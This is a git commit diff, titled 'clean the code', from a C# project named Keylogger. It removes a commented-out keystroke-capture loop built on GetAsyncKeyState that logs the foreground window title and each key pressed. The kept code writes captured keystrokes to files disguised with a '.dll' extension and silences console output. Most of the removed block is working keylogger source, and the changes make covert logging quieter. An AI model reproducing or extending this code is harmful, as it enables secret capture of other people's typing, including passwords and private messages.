54411e5967ceed142d5a480d024dbf953da5a7b0
Darkempire78 <clement.wawszczyk@gmail.com>
2021-04-04 13:00:50 +0200

    clean the code

--- Keylogger/Program.cs
+++ Keylogger/Program.cs
@@ -1,12 +1,8 @@
 ﻿using Keystroke.API;
 using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using WK.Libraries.SharpClipboardNS;
 using static WK.Libraries.SharpClipboardNS.SharpClipboard;
@@ -17,11 +13,6 @@ namespace Keylogger
     {
         string log = string.Empty;
         string currentWindowTitle = string.Empty;
-
-
-        // Get keys
-        /**[DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i);**/
 
         //Get window titles
         [DllImport("user32.dll")]
@@ -70,110 +61,6 @@ namespace Keylogger
 
                 Application.Run();
             }
-
-            /**string currentWindowTitle = "";
-            bool isShift = false;
-            bool isCapital = false;f
-            string log = "";
-
-            while (true)
-            {
-                Thread.Sleep(100);
-
-                for (int keyCode = 0; keyCode < 255; keyCode++)
-                {
-                    int keyState = GetAsyncKeyState(keyCode);
-
-                    if (keyState != 0)
-                    {
-                        String keyString = "";
-
-                        // If shift pressed
-                        if (
-                            (((Keys)keyCode) == Keys.ShiftKey) ||
-                            (((Keys)keyCode) == Keys.LShiftKey) ||
-                            (((Keys)keyCode) == Keys.RShiftKey)
-                        )
-                        {
-                            isShift = !isShift;
-                        }
-                        // If capital pressed
-                        else if (((Keys)keyCode) == Keys.Capital)
-                        {
-                            isCapital = !isCapital;
-                        }
-
-                        // if letters pressed 
-                        if (
-                                (!isShift && !isCapital) &&
-                                (keyCode >= 65 && keyCode <= 90)
-                            )
-                        {
-                            keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
-                        }
-                        else
-                        {
-                            // Replace caracters
-                            if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
-                            else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
-                            else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
-                            else if (keyCode == 188) { keyString = ","; }
-                            else if (keyCode == 52) { keyString = "'"; }
-
-                            // Ignore the mouse buttons
-                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; }
-
-                            else if (keyCode >= 96 && keyCode <= 105)
-                            {
-                                keyString = ((Keys)keyCode).ToString().Substring(6);
-                            }
-
-                            else if ((keyCode < 65 || keyCode > 90))
-                            {
-                                keyString = "<" + ((Keys)keyCode).ToString().ToUpper() + ">";
-                            }
-
-                            else
-                            {
-                                keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
-                            }
-
-                        }
-
-                        // Remove the shift
-                        if (
-                            (isShift) &&
-                            (
-                                (((Keys)keyCode) != Keys.ShiftKey) ||
-                                (((Keys)keyCode) != Keys.LShiftKey) ||
-                                (((Keys)keyCode) != Keys.RShiftKey)
-                            )
-                        )
-                        {
-                            isShift = false;
-                        }
-
-                        // Get the foreground window's title
-                        string windowTitle = getForegroundWindowTitle();
-                        if (windowTitle != currentWindowTitle && windowTitle != "")
-                        {
-                            currentWindowTitle = windowTitle;
-                            log = log + $"\n\n[Foreground Window : {currentWindowTitle}]\n";
-                        }
-
-                        // Write the log
-                        log = log + keyString;
-
-                        // https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
-                        string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
-                        string fileName = DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
-                        File.WriteAllText(Path.Combine(path, fileName), log);
-
-
-                        Console.WriteLine(log);
-                    }
-                }
-            }**/
         }
 
         public string cleanKey(string character)
@@ -205,11 +92,6 @@ namespace Keylogger
                 // Write logs
                 writeLogs(log);
             }
-
-            else
-            {
-                Console.WriteLine("no");
-            }
         }
 
         public void writeLogs(string log)
@@ -219,7 +101,7 @@ namespace Keylogger
             string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
             File.WriteAllText(Path.Combine(path, fileName), log);
 
-            Console.WriteLine(log);
+            //Console.WriteLine(log);
         }
 
     }
